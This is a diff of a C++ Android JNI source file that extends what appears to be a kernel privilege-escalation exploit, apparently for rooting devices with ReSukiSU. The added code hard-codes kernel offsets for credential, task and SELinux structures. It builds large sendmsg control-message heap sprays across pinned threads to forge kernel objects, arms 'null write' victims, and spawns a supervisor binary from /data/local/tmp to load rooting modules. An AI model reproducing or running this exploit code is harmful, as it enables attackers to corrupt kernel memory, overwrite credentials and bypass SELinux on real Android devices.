@@ -1,22 +1,29 @@
 #include <jni.h>
 
+#include "primitive_core.h"
+
+#include <android/dlext.h>
 #include <android/binder_ibinder.h>
 #include <android/binder_ibinder_jni.h>
 #include <android/log.h>
 
 #include <dirent.h>
 #include <dlfcn.h>
+#include <elf.h>
 #include <fcntl.h>
+#include <link.h>
 #include <linux/android/binder.h>
 #include <linux/capability.h>
 #include <linux/futex.h>
 #include <linux/fs.h>
+#include <linux/sched.h>
 #include <pthread.h>
 #include <sys/ioctl.h>
 #include <sys/epoll.h>
 #include <sys/eventfd.h>
 #include <sys/mman.h>
 #include <poll.h>
+#include <spawn.h>
 #include <sys/prctl.h>
 #include <sys/reboot.h>
 #include <sys/socket.h>
@@ -27,6 +34,7 @@
 #include <unistd.h>
 
 #include <algorithm>
+#include <array>
 #include <atomic>
 #include <cerrno>
 #include <cstdarg>
@@ -47,6 +55,9 @@
 #include <map>
 #include <vector>
 #include <new>
+#include <memory>
+
+bool load_ctlbuf_rescue_module();
 
 namespace {
 
@@ -69,9 +80,12 @@ constexpr std::uint32_t kRawCohortSettleCode = 0x42a1;
 constexpr std::uint32_t kVictimHoldCode = 0x4262;
 constexpr std::uint32_t kBatchEndCode = 0x4264;
 constexpr std::uint32_t kNativeBatchCode = 0x426f;
+constexpr std::uint32_t kNativeFragmentBatchCode = 0x4270;
 constexpr int kFragmentCount = 2304;
+constexpr int kNativeFragmentExportCount = 4096;
 constexpr int kEpitemPreDrainCount = 1536;
 constexpr int kEpitemCount = 4096;
+constexpr int kMixedExtraEpitemCount = 8192;
 constexpr int kRawVictimCount = 19;
 constexpr int kRawDecrementCount = 1;
 constexpr int kIsolatedRetirementCount = 64;
@@ -85,11 +99,24 @@ constexpr int kRawCohortTailCount =
         kRawCohortCount - kRawCohortVictim - 1;
 constexpr std::uint64_t kCredSecurityOffset = 120;
 constexpr std::uint64_t kKernelLinkBase = UINT64_C(0xffffffc008000000);
+constexpr char kActionSupervisorPath[] =
+        "/data/local/tmp/prism-primitive";
+constexpr off_t kReSukiLoaderSize = 1'323'008;
+constexpr off_t kReSukiExecutableSize = 4'215'752;
+constexpr off_t kReSukiModuleSize = 119'712;
+constexpr off_t kReSukiEmbeddedRescueSize = 563'952;
+constexpr std::uint64_t kActionSupervisorReceiptMagic =
+        UINT64_C(0x4c50334143545231);
+constexpr std::uint64_t kActionDaemonReadyMagic =
+        UINT64_C(0x4c50334452445931);
+constexpr std::uint64_t kActionDaemonRequestMagic =
+        UINT64_C(0x4c50334452455131);
 constexpr std::uint64_t kFairSchedClassOffset = UINT64_C(0x022e6bc0);
 constexpr std::uint64_t kEventfdFopsOffset = UINT64_C(0x02156800);
 constexpr std::uint64_t kInitCredOffset = UINT64_C(0x027a0ae0);
 constexpr std::uint64_t kInitTaskOffset = UINT64_C(0x0278bec0);
 constexpr std::uint64_t kSelinuxBlobSizesOffset = UINT64_C(0x022e81b8);
+constexpr std::uint64_t kBinderProcsOffset = UINT64_C(0x02a61e90);
 constexpr std::uint64_t kTaskTasksOffset = UINT64_C(0x4c8);
 constexpr std::uint64_t kTaskPidOffset = UINT64_C(0x5c8);
 constexpr std::uint64_t kTaskTgidOffset = UINT64_C(0x5cc);
@@ -133,6 +160,13 @@ std::mutex g_epitem_mutex;
 std::vector<int> g_epitem_fds;
 std::vector<int> g_file_probe_fds;
 std::vector<int> g_file_probe_epoll_fds;
+std::vector<int> g_mixed_epitem_fds;
+std::vector<int> g_mixed_file_probe_fds;
+std::vector<int> g_mixed_file_probe_epoll_fds;
+int g_mixed_predrain_count = 0;
+int g_mixed_pair_count = 0;
+int g_mixed_extra_epitem_count = 0;
+std::vector<std::size_t> g_mixed_binder_window;
 std::atomic<bool> g_terminal_fd_retirement_gate {false};
 std::mutex g_terminal_resource_producer_mutex;
 std::mutex g_owner_fragment_mutex;
@@ -147,6 +181,7 @@ int g_raw_retained_worker = -1;
 bool g_raw_arbitrary_handoff_failed = false;
 bool g_raw_victim0_canonical_original = false;
 int g_raw_arbitrary_rearm_worker = -1;
+std::int64_t g_fake_control_release_microseconds = -1;
 std::atomic<std::uint64_t> g_disclosed_node_address {0};
 std::atomic<std::uint64_t> g_disclosed_file_address {0};
 std::atomic<std::uint64_t> g_disclosed_epitem_address {0};
@@ -158,10 +193,19 @@ std::vector<std::uint64_t> g_node_candidates;
 std::mutex g_fake_node_mutex;
 std::vector<int> g_fake_node_fds;
 
-constexpr int kFakeControlSprayCount = 1024;
-constexpr int kFakeControlStagedCount = 32;
+constexpr int kFakeControlSprayCount = 512;
+constexpr int kFakeControlInitialSprayCount = 1024;
+constexpr int kFakeControlStagedCount = 512;
+constexpr int kFakeControlInitialStagedCount = 512;
+constexpr useconds_t kFakeControlPostBoundarySettleUs = 100000;
+constexpr int kFakeControlWriteBatchCount = 4;
+constexpr int kFakeControlWriteBatchGroupSize = kFakeControlSprayCount;
+constexpr int kFakeControlWriteBatchStagedCount =
+        kFakeControlWriteBatchCount * kFakeControlWriteBatchGroupSize;
+constexpr int kFakeControlSlotCount =
+        kFakeControlWriteBatchStagedCount + 1;
 constexpr int kFakeControlReplacementStagedCount = kFakeControlSprayCount - 1;
-constexpr std::uint64_t kFakeControlIndexMask = UINT64_C(0x3ff);
+constexpr std::uint64_t kFakeControlIndexMask = UINT64_C(0x1fff);
 constexpr std::size_t kFakeControlSize = 128;
 constexpr int kScmPressureTarget = 4096;
 constexpr int kScmPressureMinimum = 2000;
@@ -175,9 +219,14 @@ struct FakeControlSlot {
     bool created = false;
     std::atomic<int> state {0};
     std::atomic<int> activation {0};
+    int activation_group = 0;
     std::atomic<bool> staged {false};
     int staged_generation = 0;
     std::atomic<bool> rearm_requested {false};
+    std::atomic<int> reusable_cycle {0};
+    std::atomic<int> reusable_completed {0};
+    std::atomic<bool> reusable_stop {false};
+    bool reusable_worker = false;
     int result = -1;
     int rearm_result = -1;
     int saved_errno = 0;
@@ -188,7 +237,7 @@ struct FakeControlSlot {
     std::uint8_t rearm_payload[kFakeControlSize] {};
 };
 
-FakeControlSlot g_fake_control_slots[kFakeControlSprayCount];
+FakeControlSlot g_fake_control_slots[kFakeControlSlotCount];
 std::mutex g_fake_control_mutex;
 std::atomic<int> g_fake_control_gate {0};
 std::atomic<int> g_fake_control_staged_gate {0};
@@ -198,6 +247,8 @@ int g_fake_control_staged_limit = 0;
 int g_fake_control_staged_expected = 0;
 std::uint64_t g_fake_control_generation = 0;
 int g_fake_control_staged_generation = 0;
+bool g_fake_control_write_batch = false;
+int poisoned_control_count_locked();
 bool g_terminal_ctlbuf_repair_verified = false;
 bool g_terminal_ctlbuf_profile_valid = false;
 std::uint64_t g_terminal_helper_task = 0;
@@ -247,13 +298,18 @@ int g_ctlbuf_rescue_module_fd = -1;
 std::atomic<int> g_ctlbuf_rescue_plan_ready {0};
 bool g_ctlbuf_rescue_module_loaded = false;
 bool g_ctlbuf_rescue_module_unloaded = false;
-int g_ctlbuf_rescue_tids[7] {};
-std::uint64_t g_ctlbuf_rescue_nodes[7] {};
+bool g_ctlbuf_rescue_subjective_only = false;
+constexpr int kCtlbufRepairCount = 5;
+constexpr int kTerminalRequiredWrites = 4;
+int g_ctlbuf_rescue_tids[kCtlbufRepairCount] {};
+std::uint64_t g_ctlbuf_rescue_nodes[kCtlbufRepairCount] {};
 int g_selected_epoll_fd = -1;
 int g_selected_epoll_watched_fd = -1;
 int g_arb_file_fd = -1;
 int g_raw_reply_signal_fd = -1;
 std::mutex g_raw_reply_signal_mutex;
+int g_raw_target_boundary_signal_fd = -1;
+std::mutex g_raw_target_boundary_signal_mutex;
 int g_raw_target_handle = -1;
 int g_raw_target_pid = -1;
 std::uint64_t g_raw_target_proc = 0;
@@ -297,12 +353,17 @@ bool g_direct_init_target = false;
 bool g_direct_security_repair = false;
 bool g_direct_cred_quarantine = false;
 bool g_direct_terminal_cleanup = false;
+bool g_direct_subjective_only = false;
 int g_direct_write_step = 0;
 int g_internal_write_misses = 0;
 int g_write_victims_used = 0;
 int g_write_successes = 0;
 bool g_null_write_armed = false;
 int g_null_write_armed_victim = -1;
+std::set<int> g_null_write_batch_armed;
+std::set<int> g_null_write_batch_selected;
+bool g_null_write_batch_prepared = false;
+int g_null_write_batch_next_victim = 1;
 std::uint64_t g_direct_init_real_cred_slot = 0;
 std::uint64_t g_direct_init_cred_slot = 0;
 std::uint64_t g_direct_cred_value = 0;
@@ -345,24 +406,85 @@ std::atomic<int> g_command_watchdog_arm {0};
 std::atomic<int> g_command_watchdog_ready {0};
 std::atomic<int> g_command_watchdog_normalise {0};
 std::atomic<int> g_command_watchdog_exit {0};
+std::atomic<int> g_command_watchdog_heartbeat {0};
 std::atomic<int> g_command_watchdog_tid {-1};
 std::atomic<int> g_resukisu_action {0};
 std::atomic<int> g_resukisu_exit {-1};
 std::atomic<int> g_resukisu_errno {0};
 std::atomic<int> g_resukisu_manager_uid {-1};
 std::atomic<std::uint64_t> g_resukisu_kernel_base {0};
+std::atomic<int> g_resukisu_child_pid {-1};
+std::atomic<int> g_resukisu_diagnostic_fd {-1};
+std::atomic<int> g_resukisu_completion_fd {-1};
+std::atomic<int> g_resukisu_registration_read_fd {-1};
+std::atomic<int> g_resukisu_registration_write_fd {-1};
+std::atomic<int> g_resukisu_receipt_stage {0};
+std::atomic<int> g_resukisu_receipt_bytes {0};
+std::atomic<int> g_resukisu_receipt_detail {0};
+std::atomic<int> g_resukisu_spawn_stage {0};
+std::atomic<int> g_resukisu_spawn_error {0};
+std::atomic<int> g_action_loader_request {0};
+std::atomic<int> g_action_loader_gate {0};
+std::atomic<int> g_action_loader_relocation {-1};
+std::atomic<int> g_action_loader_stage {-1};
+std::atomic<int> g_action_loader_result {-1};
+alignas(4) int g_resukisu_raw_pidfd = -1;
 int g_resukisu_fd = -1;
 int g_resukisu_module_fd = -1;
+int g_resukisu_loader_source_fd = -1;
+int g_resukisu_loader_fd = -1;
+int g_resukisu_rescue_backup_fd = -1;
+int g_action_supervisor_source_fd = -1;
+int g_action_supervisor_fd = -1;
+int g_action_daemon_parent_fd = -1;
+int g_action_daemon_child_fd = -1;
+pthread_t g_action_daemon_spawner_thread {};
+bool g_action_daemon_spawner_created = false;
+std::atomic<int> g_action_daemon_spawn_stage {0};
+std::atomic<int> g_action_daemon_pid {-1};
 using ReSukiProbeFunction = std::uint32_t (*)();
 using ReSukiRelocateProbeFunction = int (*)(std::uint64_t);
 using ReSukiStageFunction = int (*)(int, std::uint64_t);
+using ReSukiReplaceFunction = int (*)(const std::uint8_t*, std::size_t);
 using ReSukiLoadFunction = int (*)(
         std::uint32_t, int, int, std::uint64_t);
 ReSukiProbeFunction g_resukisu_probe = nullptr;
 ReSukiRelocateProbeFunction g_resukisu_relocate_probe = nullptr;
 ReSukiStageFunction g_resukisu_stage = nullptr;
+ReSukiReplaceFunction g_resukisu_replace = nullptr;
 ReSukiLoadFunction g_resukisu_load = nullptr;
 void* g_resukisu_library = nullptr;
+ReSukiProbeFunction g_action_resukisu_probe = nullptr;
+ReSukiRelocateProbeFunction g_action_resukisu_relocate_probe = nullptr;
+ReSukiStageFunction g_action_resukisu_stage = nullptr;
+ReSukiLoadFunction g_action_resukisu_load = nullptr;
+void* g_action_resukisu_library = nullptr;
+int g_action_resukisu_module_fd = -1;
+std::vector<std::uint8_t> g_resukisu_rescue_image;
+std::vector<std::uint8_t> g_resukisu_staged_image;
+
+struct ActionSupervisorReceipt {
+    std::uint64_t magic = 0;
+    std::int32_t pid = -1;
+    std::int32_t tid = -1;
+    std::int32_t action = 0;
+    std::int32_t manager_uid = -1;
+    std::uint64_t kernel_base = 0;
+};
+
+struct ActionDaemonReady {
+    std::uint64_t magic = 0;
+    std::int32_t pid = -1;
+    std::int32_t tid = -1;
+};
+
+struct ActionDaemonRequest {
+    std::uint64_t magic = 0;
+    std::int32_t action = 0;
+    std::int32_t manager_uid = -1;
+    std::uint64_t kernel_base = 0;
+    char completion_path[160] {};
+};
 std::atomic<int> g_ctlbuf_donor_freeze_request {0};
 std::atomic<int> g_ctlbuf_donor_pid {-1};
 std::atomic<int> g_ctlbuf_donor_signal_state {0};
@@ -377,6 +499,8 @@ std::atomic<int> g_ctlbuf_rescue_stage {0};
 std::atomic<int> g_ctlbuf_rescue_result {0};
 std::atomic<int> g_ctlbuf_rescue_errno {0};
 std::atomic<int> g_ctlbuf_rescue_detail {0};
+std::atomic<int> g_ctlbuf_rescue_load_request {0};
+std::atomic<int> g_ctlbuf_rescue_load_result {0};
 std::mutex g_ctlbuf_finalise_mutex;
 std::string g_ctlbuf_finalise_proof;
 bool g_ctlbuf_finalise_verified = false;
@@ -506,6 +630,7 @@ std::uint64_t g_last_binder_probe_init_security = 0;
 std::uint32_t g_last_binder_probe_init_sid = 0;
 std::uint64_t g_last_main_binder_proc = 0;
 std::uint64_t g_last_binder_probe_anchor_proc = 0;
+std::uint64_t g_last_binder_probe_binder_head = 0;
 std::uint64_t g_last_target_binder_proc = 0;
 int g_last_binder_probe_nodes = 0;
 int g_last_binder_probe_marker_offset = -1;
@@ -530,6 +655,7 @@ std::mutex g_raw_isolated_mutex;
 enum class IsolatedRetirementState {
     kIdle,
     kCollecting,
+    kReferencesReleased,
     kRecorded,
     kRetiring,
     kProved,
@@ -544,6 +670,30 @@ std::vector<int> g_raw_isolated_pids;
 int g_raw_isolated_historical_total = 0;
 int g_raw_isolated_historical_retired = 0;
 bool g_raw_isolated_retirement_proved = false;
+bool g_raw_context_retirement_proved = false;
+struct RawRouteReleaseReceipt {
+    std::uint64_t generation = 0;
+    int contexts = 0;
+    int handles = 0;
+    int death_notifications = 0;
+    int mappings = 0;
+    int descriptors = 0;
+    bool valid = false;
+};
+RawRouteReleaseReceipt g_raw_route_release_receipt;
+
+bool valid_raw_route_release_profile(
+        int contexts, int handles, int deaths) {
+    return (contexts == 128 && handles == 7360 && deaths == 128) ||
+            (contexts == 128 && handles == 256 && deaths == 0) ||
+            (contexts == 256 && handles == 512 && deaths == 0) ||
+            (contexts == 256 && handles == 264 && deaths == 8) ||
+            (contexts == 256 && handles == 520 && deaths == 8) ||
+            (contexts == 384 && handles == 392 && deaths == 8) ||
+            (contexts == 384 && handles == 776 && deaths == 8) ||
+            (contexts == 512 && handles == 520 && deaths == 8) ||
+            (contexts == 512 && handles == 1032 && deaths == 8);
+}
 int g_raw_controlled_free_pending_victim = -1;
 std::set<int> g_raw_controlled_unlinks;
 std::string g_terminal_cleanup_result;
@@ -594,16 +744,24 @@ struct IsolatedRetirementSnapshot {
     int retired = 0;
     int controlled_unlinks = 0;
     bool proved = false;
+    bool raw_contexts = false;
     std::set<int> controlled_unlink_victims;
 };
 
 IsolatedRetirementSnapshot consume_isolated_retirement_proof() {
     std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
     IsolatedRetirementSnapshot snapshot;
+    bool isolated_cardinality = !g_raw_context_retirement_proved &&
+            g_raw_isolated_pids.size() == kIsolatedRetirementCount &&
+            g_raw_isolated_historical_total == kIsolatedRetirementCount &&
+            g_raw_isolated_historical_retired ==
+                    kIsolatedRetirementCount;
+    bool raw_cardinality = g_raw_context_retirement_proved &&
+            g_raw_isolated_pids.empty() &&
+            g_raw_isolated_historical_total == 512 &&
+            g_raw_isolated_historical_retired == 512;
     if (g_raw_isolated_state == IsolatedRetirementState::kProved &&
-        g_raw_isolated_pids.size() == kIsolatedRetirementCount &&
-        g_raw_isolated_historical_total == kIsolatedRetirementCount &&
-        g_raw_isolated_historical_retired == kIsolatedRetirementCount &&
+        (isolated_cardinality || raw_cardinality) &&
         g_raw_isolated_retirement_proved) {
         snapshot.total = g_raw_isolated_historical_total;
         snapshot.retired = g_raw_isolated_historical_retired;
@@ -611,12 +769,15 @@ IsolatedRetirementSnapshot consume_isolated_retirement_proof() {
                 static_cast<int>(g_raw_controlled_unlinks.size());
         snapshot.controlled_unlink_victims = g_raw_controlled_unlinks;
         snapshot.proved = true;
+        snapshot.raw_contexts = raw_cardinality;
 
         g_raw_isolated_state = IsolatedRetirementState::kConsumed;
         g_raw_isolated_pids.clear();
         g_raw_isolated_historical_total = 0;
         g_raw_isolated_historical_retired = 0;
         g_raw_isolated_retirement_proved = false;
+        g_raw_context_retirement_proved = false;
+        g_raw_route_release_receipt = {};
         g_raw_controlled_free_pending_victim = -1;
         g_raw_controlled_unlinks.clear();
     }
@@ -641,6 +802,9 @@ struct BatchToken {
         return ptr == other.ptr && cookie == other.cookie;
     }
 };
+
+std::mutex g_split_disclosure_mutex;
+std::vector<BatchToken> g_split_disclosure_tokens;
 
 constexpr int kPteCandidates = 32;
 constexpr int kPteMappingsPerCandidate = 512;
@@ -1409,14 +1573,14 @@ OwnerRetirementProof read_owner_retirement_proof(
             read_text_file(
                     directory + "/owner-terminal-retirement.result"),
             {"status", "stage", "nonce", "owner_pid",
-             "owner_start_time", "boot_id", "self_exit"}, &fields);
+             "owner_start_time", "boot_id", "exit_signal"}, &fields);
     bool metadata = parsed && fields["status"] == "pass" &&
             fields["stage"] == "owner-terminal-retirement" &&
             !watchdog.nonce.empty() && fields["nonce"] == watchdog.nonce &&
             !watchdog.boot_id.empty() &&
             fields["boot_id"] == watchdog.boot_id &&
             decimal_digits(fields["owner_start_time"]) &&
-            fields["self_exit"] == "1" &&
+            fields["exit_signal"] == "9" &&
             parse_int_field(fields["owner_pid"], &proof.pid) &&
             proof.pid > 0;
     errno = 0;
@@ -1487,6 +1651,24 @@ bool wait_for_file_byte(const std::string& path, char expected,
     }
     close(fd);
     return matched;
+}
+
+bool wait_for_file_byte_fast(const std::string& path, char expected,
+                             int attempts) {
+    for (int attempt = 0; attempt < attempts; ++attempt) {
+        int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
+        if (fd >= 0) {
+            char value = 0;
+            bool matched = pread(fd, &value, 1, 0) == 1 &&
+                    value == expected;
+            close(fd);
+            if (matched) {
+                return true;
+            }
+        }
+        usleep(100);
+    }
+    return false;
 }
 
 bool kernel_pointer(std::uint64_t value) {
@@ -1581,7 +1763,12 @@ void* run_fake_control_sender(void* argument) {
         return nullptr;
     }
     slot->state.store(1, std::memory_order_release);
-    if (slot->staged.load(std::memory_order_acquire)) {
+    if (slot->activation_group > 0) {
+        while (slot->activation.load(std::memory_order_acquire) == 0) {
+            syscall(SYS_futex, &slot->activation, FUTEX_WAIT_PRIVATE, 0,
+                    nullptr, nullptr, 0);
+        }
+    } else if (slot->staged.load(std::memory_order_acquire)) {
         while (g_fake_control_staged_gate.load(
                        std::memory_order_acquire) !=
                 slot->staged_generation) {
@@ -1632,6 +1819,75 @@ void* run_fake_control_sender(void* argument) {
     return nullptr;
 }
 
+void* run_reusable_fake_control_sender(void* argument) {
+    auto* slot = static_cast<FakeControlSlot*>(argument);
+    slot->tid = static_cast<pid_t>(syscall(SYS_gettid));
+    if (slot->tid <= 0 ||
+        prctl(PR_SET_NAME, "lp3-fake-ctl", 0, 0, 0) != 0) {
+        slot->saved_errno = errno;
+        slot->state.store(3, std::memory_order_release);
+        return nullptr;
+    }
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(2, &set);
+    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
+        slot->saved_errno = errno;
+        slot->state.store(3, std::memory_order_release);
+        return nullptr;
+    }
+    int observed_cycle = 0;
+    while (true) {
+        slot->state.store(0, std::memory_order_release);
+        int cycle = slot->reusable_cycle.load(std::memory_order_acquire);
+        while (cycle == observed_cycle &&
+               !slot->reusable_stop.load(std::memory_order_acquire)) {
+            syscall(SYS_futex, &slot->reusable_cycle,
+                    FUTEX_WAIT_PRIVATE, observed_cycle,
+                    nullptr, nullptr, 0);
+            cycle = slot->reusable_cycle.load(std::memory_order_acquire);
+        }
+        if (slot->reusable_stop.load(std::memory_order_acquire)) {
+            break;
+        }
+        observed_cycle = cycle;
+        slot->state.store(1, std::memory_order_release);
+        if (slot->staged.load(std::memory_order_acquire)) {
+            while (g_fake_control_staged_gate.load(
+                           std::memory_order_acquire) !=
+                    slot->staged_generation) {
+                int expected = g_fake_control_staged_gate.load(
+                        std::memory_order_acquire);
+                syscall(SYS_futex, &g_fake_control_staged_gate,
+                        FUTEX_WAIT_PRIVATE, expected,
+                        nullptr, nullptr, 0);
+            }
+        } else {
+            while (g_fake_control_gate.load(std::memory_order_acquire) == 0) {
+                syscall(SYS_futex, &g_fake_control_gate,
+                        FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0);
+            }
+        }
+        iovec vector {slot->payload, sizeof(slot->payload)};
+        msghdr message {};
+        message.msg_iov = &vector;
+        message.msg_iovlen = 1;
+        message.msg_control = slot->payload;
+        message.msg_controllen = sizeof(slot->payload);
+        slot->state.store(2, std::memory_order_release);
+        errno = 0;
+        slot->result = static_cast<int>(syscall(
+                SYS_sendmsg, slot->pair[0], &message, 0));
+        slot->saved_errno = errno;
+        slot->reusable_completed.store(cycle, std::memory_order_release);
+        if (slot->reusable_stop.load(std::memory_order_acquire)) {
+            break;
+        }
+    }
+    slot->state.store(3, std::memory_order_release);
+    return nullptr;
+}
+
 bool close_owned_fd(int fd) {
     errno = 0;
     return close(fd) == 0;
@@ -1644,10 +1900,14 @@ bool fake_control_slot_active_staged(const FakeControlSlot& slot) {
 
 void wake_fake_control_staged_waiters_locked() {
     bool has_waiters = false;
-    for (const auto& slot : g_fake_control_slots) {
+    for (auto& slot : g_fake_control_slots) {
+        if (slot.created && slot.activation_group > 0) {
+            slot.activation.store(1, std::memory_order_release);
+            syscall(SYS_futex, &slot.activation, FUTEX_WAKE_PRIVATE, 1,
+                    nullptr, nullptr, 0);
+        }
         if (slot.created && slot.staged.load(std::memory_order_acquire)) {
             has_waiters = true;
-            break;
         }
     }
     if (!has_waiters || g_fake_control_staged_generation == 0) {
@@ -1659,8 +1919,54 @@ void wake_fake_control_staged_waiters_locked() {
             INT_MAX, nullptr, nullptr, 0);
 }
 
+bool drain_reusable_fake_control_slot_locked(FakeControlSlot* slot) {
+    if (slot == nullptr || !slot->reusable_worker || slot->poisoned ||
+        !slot->created || slot->pair[0] < 0 || slot->pair[1] < 0) {
+        return false;
+    }
+    int cycle = slot->reusable_cycle.load(std::memory_order_acquire);
+    std::uint8_t payload[kFakeControlSize] {};
+    auto deadline = std::chrono::steady_clock::now() +
+            std::chrono::seconds(2);
+    while (slot->reusable_completed.load(std::memory_order_acquire) != cycle &&
+           std::chrono::steady_clock::now() < deadline) {
+        ssize_t received = recv(slot->pair[1], payload, sizeof(payload),
+                                MSG_DONTWAIT);
+        if (received == static_cast<ssize_t>(sizeof(payload)) ||
+            (received < 0 && errno == EINTR)) {
+            continue;
+        }
+        if (received < 0 &&
+            (errno == EAGAIN || errno == EWOULDBLOCK)) {
+            usleep(50);
+            continue;
+        }
+        return false;
+    }
+    if (slot->reusable_completed.load(std::memory_order_acquire) != cycle) {
+        return false;
+    }
+    ssize_t received = 0;
+    do {
+        received = recv(slot->pair[1], payload, sizeof(payload),
+                        MSG_DONTWAIT);
+    } while (received > 0 || (received < 0 && errno == EINTR));
+    if (received >= 0 || (errno != EAGAIN && errno != EWOULDBLOCK)) {
+        return false;
+    }
+    for (int attempt = 0; attempt < 20000; ++attempt) {
+        if (slot->state.load(std::memory_order_acquire) == 0) {
+            return true;
+        }
+        usleep(50);
+    }
+    return slot->state.load(std::memory_order_acquire) == 0;
+}
+
 int release_fake_control_spray_locked() {
+    const auto started = std::chrono::steady_clock::now();
     if (!g_fake_control_active) {
+        g_fake_control_release_microseconds = 0;
         return 0;
     }
     wake_fake_control_staged_waiters_locked();
@@ -1668,8 +1974,21 @@ int release_fake_control_spray_locked() {
     syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE, INT_MAX,
             nullptr, nullptr, 0);
     bool close_valid = true;
+    int joined = 0;
     for (auto& slot : g_fake_control_slots) {
         if (slot.poisoned) {
+            continue;
+        }
+        if (slot.reusable_worker) {
+            bool drained = drain_reusable_fake_control_slot_locked(&slot);
+            close_valid = drained && close_valid;
+            if (drained) {
+                ++joined;
+                slot.staged.store(false, std::memory_order_relaxed);
+                slot.staged_generation = 0;
+                slot.activation.store(0, std::memory_order_relaxed);
+                slot.activation_group = 0;
+            }
             continue;
         }
         if (slot.pair[1] >= 0) {
@@ -1688,14 +2007,11 @@ int release_fake_control_spray_locked() {
                 slot.rearm_pair[1] = -1;
             }
         }
-    }
-    int joined = 0;
-    for (auto& slot : g_fake_control_slots) {
-        if (slot.poisoned) {
-            continue;
-        }
         if (slot.created) {
-            pthread_join(slot.thread, nullptr);
+            if (pthread_join(slot.thread, nullptr) != 0) {
+                close_valid = false;
+                continue;
+            }
             slot.created = false;
             ++joined;
         }
@@ -1719,6 +2035,7 @@ int release_fake_control_spray_locked() {
             slot.staged_generation = 0;
             slot.rearm_requested.store(false, std::memory_order_relaxed);
             slot.activation.store(0, std::memory_order_relaxed);
+            slot.activation_group = 0;
             slot.poison_victim = -1;
             slot.tid = -1;
             slot.state.store(0, std::memory_order_relaxed);
@@ -1729,15 +2046,112 @@ int release_fake_control_spray_locked() {
         g_fake_control_expected = 0;
         g_fake_control_staged_limit = 0;
         g_fake_control_staged_expected = 0;
+        g_fake_control_write_batch = false;
         g_fake_control_gate.store(0, std::memory_order_relaxed);
         g_fake_control_staged_gate.store(0, std::memory_order_relaxed);
     }
+    g_fake_control_release_microseconds =
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    std::chrono::steady_clock::now() - started).count();
     return close_valid ? joined : -1;
 }
 
 int release_fake_control_spray() {
     std::lock_guard<std::mutex> lock(g_fake_control_mutex);
     return release_fake_control_spray_locked();
+}
+
+int release_fake_control_write_group_locked(int group, int retained_index) {
+    if (!g_fake_control_active || !g_fake_control_write_batch ||
+            group <= 0 || group > kFakeControlWriteBatchCount ||
+            retained_index < 0 || retained_index >= kFakeControlSlotCount) {
+        return -1;
+    }
+    int candidates = 0;
+    bool close_valid = true;
+    for (int index = 0; index < kFakeControlSlotCount; ++index) {
+        auto& slot = g_fake_control_slots[index];
+        if (index == retained_index || slot.poisoned || !slot.created ||
+                slot.activation_group != group) {
+            continue;
+        }
+        ++candidates;
+        close_valid = slot.tid > 0 &&
+                pthread_detach(slot.thread) == 0 && close_valid;
+    }
+    if (candidates != kFakeControlWriteBatchGroupSize - 1) {
+        return -1;
+    }
+    for (int index = 0; index < kFakeControlSlotCount; ++index) {
+        auto& slot = g_fake_control_slots[index];
+        if (index == retained_index || slot.poisoned || !slot.created ||
+                slot.activation_group != group) {
+            continue;
+        }
+        if (slot.pair[1] >= 0) {
+            shutdown(slot.pair[1], SHUT_RDWR);
+            bool closed = close_owned_fd(slot.pair[1]);
+            close_valid = closed && close_valid;
+            if (closed) {
+                slot.pair[1] = -1;
+            }
+        }
+    }
+    int retired = 0;
+    bool all_retired = false;
+    for (int attempt = 0; attempt < 5000; ++attempt) {
+        retired = 0;
+        for (int index = 0; index < kFakeControlSlotCount; ++index) {
+            const auto& slot = g_fake_control_slots[index];
+            if (index == retained_index || slot.poisoned || !slot.created ||
+                    slot.activation_group != group) {
+                continue;
+            }
+            errno = 0;
+            int live = slot.tid > 0
+                    ? static_cast<int>(syscall(
+                            SYS_tgkill, getpid(), slot.tid, 0)) : -1;
+            bool gone = slot.state.load(std::memory_order_acquire) >= 3 &&
+                    live == -1 && errno == ESRCH;
+            retired += gone ? 1 : 0;
+        }
+        if (retired == candidates) {
+            all_retired = true;
+            break;
+        }
+        usleep(1000);
+    }
+    if (!all_retired) {
+        return -1;
+    }
+    for (int index = 0; index < kFakeControlSlotCount; ++index) {
+        auto& slot = g_fake_control_slots[index];
+        if (index == retained_index || slot.poisoned || !slot.created ||
+                slot.activation_group != group) {
+            continue;
+        }
+        slot.created = false;
+        if (slot.pair[0] >= 0) {
+            bool closed = close_owned_fd(slot.pair[0]);
+            close_valid = closed && close_valid;
+            if (closed) {
+                slot.pair[0] = -1;
+            }
+        }
+        slot.staged.store(false, std::memory_order_relaxed);
+        slot.staged_generation = 0;
+        slot.rearm_requested.store(false, std::memory_order_relaxed);
+        slot.activation.store(0, std::memory_order_relaxed);
+        slot.activation_group = 0;
+        slot.poison_victim = -1;
+        slot.tid = -1;
+        slot.state.store(0, std::memory_order_relaxed);
+    }
+    if (!close_valid || retired != candidates) {
+        return -1;
+    }
+    g_fake_control_expected -= retired;
+    return retired;
 }
 
 bool close_rearmed_fake_control_slot_locked(FakeControlSlot* slot,
@@ -1789,6 +2203,7 @@ bool close_rearmed_fake_control_slot_locked(FakeControlSlot* slot,
     slot->staged_generation = 0;
     slot->rearm_requested.store(false, std::memory_order_relaxed);
     slot->activation.store(0, std::memory_order_relaxed);
+    slot->activation_group = 0;
     slot->tid = -1;
     slot->state.store(0, std::memory_order_relaxed);
     if (clear_poison) {
@@ -1801,12 +2216,27 @@ bool close_rearmed_fake_control_slot_locked(FakeControlSlot* slot,
 bool prepare_fake_control_spray(const std::uint8_t* payload,
                                 int* prefilled_messages,
                                 bool indexed = false,
-                                int staged_limit = kFakeControlStagedCount) {
+                                int staged_limit = kFakeControlStagedCount,
+                                const std::uint8_t* const* grouped_payloads =
+                                        nullptr,
+                                int grouped_payload_count = 0,
+                                int grouped_payload_size = 0,
+                                int spray_count = kFakeControlSprayCount) {
     std::lock_guard<std::mutex> lock(g_fake_control_mutex);
+    bool grouped = grouped_payloads != nullptr &&
+            grouped_payload_count == kFakeControlWriteBatchCount &&
+            grouped_payload_size == kFakeControlWriteBatchGroupSize &&
+            staged_limit == kFakeControlWriteBatchStagedCount;
+    for (int index = 0; grouped && index < grouped_payload_count; ++index) {
+        grouped = grouped_payloads[index] != nullptr;
+    }
+    bool reusable = false;
     if (g_terminal_fd_retirement_gate.load(
                 std::memory_order_acquire) ||
